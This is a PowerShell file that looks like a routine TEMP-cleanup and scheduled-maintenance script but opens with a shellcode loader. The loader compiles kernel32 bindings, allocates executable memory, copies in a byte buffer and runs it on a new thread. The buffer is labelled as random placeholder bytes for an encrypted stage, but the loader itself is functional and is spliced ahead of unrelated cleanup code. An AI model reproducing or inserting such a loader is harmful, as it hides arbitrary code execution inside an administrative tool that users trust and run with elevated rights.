
[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeMethods
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x55, 0xda, 0x6b, 0x7e, 0xd3, 0x83, 0xc4, 0xcc, 0x19, 0xcd, 0x0f, 0x05, 0x35, 0x50, 0x60, 0x65,
        0x28, 0x3a, 0xb2, 0x4f, 0x50, 0x16, 0x78, 0x28, 0xf3, 0xe7, 0x5b, 0xec, 0x6d, 0xea, 0x40, 0x31,
        0x53, 0xb7, 0x83, 0xa5, 0x4c, 0x1e, 0xaa, 0xb7, 0xaa, 0xce, 0xbf, 0x94, 0x53, 0xb0, 0xf9, 0x6e,
        0xea, 0x85, 0x2a, 0x80, 0xed, 0xc4, 0x2a, 0x30, 0xe8, 0xd0, 0x9f, 0x6d, 0x25, 0xb0, 0x39, 0x2f,
        0xd4, 0x3b, 0x7d, 0xb2, 0xba, 0xdf, 0xf5, 0xbf, 0x24, 0x1f, 0xa8, 0x75, 0xf6, 0xdf, 0xfb, 0x2f,
        0xef, 0x3a, 0x08, 0x1f, 0xa6, 0x18, 0x95, 0xee, 0xe3, 0xaf, 0x2b, 0x57, 0xd1, 0x4c, 0xf1, 0x9c,
        0xed, 0x3d, 0xa6, 0x7b, 0xad, 0x9a, 0xd4, 0x1b, 0x04, 0x1c, 0x5d, 0xb7, 0xf2, 0x92, 0xe1, 0xd7,
        0x04, 0xc6, 0xcf, 0x86, 0x4e, 0x94, 0x12, 0x2a, 0x03, 0x73, 0xa3, 0xfe, 0x3f, 0x51, 0x48, 0xcd,
        0x5c, 0x66, 0x4c, 0x73, 0xc4, 0x9a, 0xf2, 0xd3, 0x20, 0x2f, 0xf6, 0x4c, 0xf1, 0xdc, 0x9c, 0x6e,
        0x45, 0xb9, 0x8c, 0xca, 0x4c, 0x7c, 0x35, 0xdd, 0xdd, 0xea, 0x0c, 0xfc, 0x9e, 0xd3, 0xdb, 0x46,
        0x21, 0xa5, 0xdd, 0xdc, 0xae, 0x76, 0x47, 0x68, 0x87, 0x02, 0x28, 0x8b, 0x9c, 0xcf, 0x79, 0x32,
        0x7c, 0xe8, 0x35, 0x61, 0x6f, 0x9e, 0xd0, 0x72, 0x2d, 0x97, 0xe9, 0xce, 0xf5, 0xe6, 0x16, 0x5a,
        0x4e, 0x6c, 0xd8, 0xad, 0x12, 0x70, 0x0f, 0x14, 0x52, 0x62, 0xe7, 0xc2, 0xb0, 0x67, 0xbf, 0x0e,
        0xb2, 0x29, 0x4f, 0xe3, 0x5b, 0x42, 0x43, 0x40, 0x0e, 0x81, 0xe2, 0xbb, 0x2b, 0x0f, 0x93, 0x6f,
        0x28, 0xf8, 0x9c, 0xc5, 0xa6, 0xd0, 0xde, 0x0d, 0x25, 0xe8, 0xe3, 0x38, 0x86, 0xf9, 0x6f, 0x46,
        0x4e, 0x12, 0xd6, 0x43, 0x79, 0xef, 0x40, 0xe8, 0xec, 0xf1, 0xff, 0xf7, 0xf2, 0x6d, 0x36, 0xd5,
        0x5d, 0xd8, 0x08, 0x8a, 0xc0, 0xdb, 0x2a, 0xa8, 0x55, 0xd7, 0xdd, 0x80, 0xda, 0xab, 0x56, 0x19,
        0x95, 0x93, 0x43, 0x50, 0x67, 0x38, 0x5f, 0xf6, 0x6f, 0x2d, 0x5b, 0xb4, 0xc4, 0x06, 0xe0, 0x97,
        0x87, 0x81, 0x7d, 0x59, 0x18, 0x93, 0xd3, 0x12, 0x58, 0xb2, 0x4a, 0xdb, 0xc4, 0x08, 0x9f, 0xeb,
        0x67, 0x9c, 0x3a, 0xa3, 0xec, 0xb8, 0x5c, 0x6f, 0x73, 0xf8, 0x7d, 0x2a, 0xa7, 0x5e, 0xc5, 0x13,
        0xfc, 0x4c, 0x32, 0x80, 0xeb, 0x57, 0xec, 0xf4, 0xca, 0xb4, 0xd8, 0x84, 0x84, 0xf2, 0xac, 0x6d,
        0x7a, 0xb3, 0x96, 0xda, 0xd1, 0x20, 0x5d, 0x43, 0xea, 0xd4, 0xea, 0xe0, 0xcb, 0xa9, 0x56, 0x72,
        0x99, 0xad
    )

    $BufferAddress = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($BufferAddress -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $BufferAddress, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $BufferAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeMethods]::WaitForSingleObject($Thread, 578)
    [void][NativeMethods]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
$ErrorActionPreference = "Stop"
$TempRoot  = $env:TEMP
$AgeDays   = 21
$MinSizeMB = 2
$LogPath   = "C:\Logs\temp-cleanup-2026-06-14.log"
$DryRun    = $false
if (-not (Test-Path -LiteralPath $TempRoot)) {
    throw ("Temp path not found: {0}" -f $TempRoot)
}
$cutoff = (Get-Date).AddDays(-$AgeDays)
$allFiles = @(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue)
$beforeMB = [math]::Round((($allFiles | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
$stale = $allFiles | Where-Object {
    $_.LastWriteTime -lt $cutoff -and $_.Length -ge ($MinSizeMB * 1MB)
}
$reclaimMB = [math]::Round((($stale | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
Write-Host ("Before: {0} MB | Reclaimable: {1} MB across {2} files" -f $beforeMB, $reclaimMB, @($stale).Count) -ForegroundColor Cyan

function Write-MaintenanceLog {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Message,

        [ValidateSet('INFO', 'WARN', 'ERROR')]
        [string]$Level = 'INFO'
    )

    $line = "{0} [{1}] {2}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message
    Add-Content -Path $LogPath -Value $line -Encoding UTF8
    if ($Level -eq 'ERROR') {
        Write-Host $line -ForegroundColor Red
    }
}
& Write-MaintenanceLog -Message ("Cleanup started for {0}" -f $TempRoot) -Level INFO

foreach ($file in $stale) {
    if (-not $file.FullName.StartsWith($TempRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
        continue
    }
    Remove-Item -LiteralPath $file.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
}
$remainingMB = [math]::Round((@(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue) |
    Measure-Object -Property Length -Sum).Sum / 1MB, 1)

$emptyDirs = Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -Directory -ErrorAction SilentlyContinue |
    Where-Object { @(Get-ChildItem -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue).Count -eq 0 }
foreach ($dir in $emptyDirs) {
    if ($dir.LastWriteTime -lt $cutoff) {
        Remove-Item -LiteralPath $dir.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
    }
}

$byExtension = $stale | Group-Object -Property Extension |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byExtension | Format-Table Name, Count -AutoSize

$report = [pscustomobject]@{
    TempRoot    = $TempRoot
    AgeDays     = $AgeDays
    Files       = @($stale).Count
    ReclaimedMB = $reclaimMB
    RemainingMB = $remainingMB
    CompletedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}
$report | ConvertTo-Json -Depth 3 | Set-Content -Path $LogPath.Replace('.log', '.json') -Encoding UTF8

$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -File C:\Scripts\Clear-TempFiles.ps1'
$trigger = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Sunday -At "23:45"
Register-ScheduledTask -TaskName "Weekly-TempSweep" -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null

$MailTo = 'ops@internal.corp'

Send-MailMessage -To $MailTo -From 'ops@internal.corp' -Subject "TEMP cleanup summary" -Body "The scheduled TEMP sweep completed. See the JSON report on the host." -SmtpServer 'smtp.adatum.com' -Port 25

& Write-MaintenanceLog -Message ("Cleanup finished: {0} MB reclaimed" -f $reclaimMB) -Level INFO
Write-Host ("Cleanup finished on {0}" -f $env:COMPUTERNAME) -ForegroundColor Green

$recent = $allFiles | Where-Object { $_.LastWriteTime -ge $cutoff }
Write-Verbose ("Files kept because they are recent: {0}" -f @($recent).Count)

$locked = @($stale | Where-Object { $_.IsReadOnly })
Write-Verbose ("Read-only candidates skipped: {0}" -f $locked.Count)

$sessionTemp = Join-Path $env:TEMP 'cleanup-session'
Write-Verbose ("Session folder: {0}" -f $sessionTemp)

$largest = $stale | Sort-Object -Property Length -Descending | Select-Object -First 5
$largest | Format-Table Name, @{Name = 'SizeMB'; Expression = { [math]::Round($_.Length / 1MB, 2) }} -AutoSize

$tempDrive = Get-PSDrive -Name ($TempRoot.Substring(0, 1)) -ErrorAction SilentlyContinue
if ($tempDrive) {
    Write-Verbose ("Free space: {0} GB" -f [math]::Round($tempDrive.Free / 1GB, 1))
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
